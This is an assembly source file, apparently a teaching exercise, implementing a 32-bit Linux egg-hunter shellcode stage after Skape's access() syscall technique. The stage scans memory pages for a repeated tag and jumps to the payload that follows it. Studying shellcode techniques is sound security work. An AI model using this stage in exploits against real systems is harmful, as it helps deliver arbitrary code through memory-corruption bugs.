; This is an example of an egg-hunter.
; Targets 32-bit Linux OS -- Vikrant Navalgund
; Based on Matt Miller's(Skape) paper, access() syscall method. 

BITS 32

%define _EGG_TAG     0x50905090 ;0x55485349
%define _SYSCALL_ERR 0xF2 
%define _EGG_SIZE    0x8

section .text
global _start
_start:
	; int access(const char* pathname, int mode); __NR_access 33(0x21)
	;           ( 0 * PAGE_SIZE, R_OK)
	;
	xor ebx, ebx
	mul ecx
    mov cl, 0x04      ; R_OK	
	mov edx, _EGG_TAG
	push byte 0x21
	pop eax

	_find_vma:
	    or bx, 0xfff ; Goto the next PAGE_SIZE page addr/offset
	
	_peek_vma:
		inc ebx
		pusha
		lea ebx, [ebx + 0x4]
		int 0x80
		cmp al, _SYSCALL_ERR
		popa
		jz _find_vma
		cmp DWORD [ebx], edx
		jnz _peek_vma
		cmp DWORD [ebx + 0x4], edx
		jnz _peek_vma
		lea ebx, [ebx + _EGG_SIZE]
		jmp ebx 
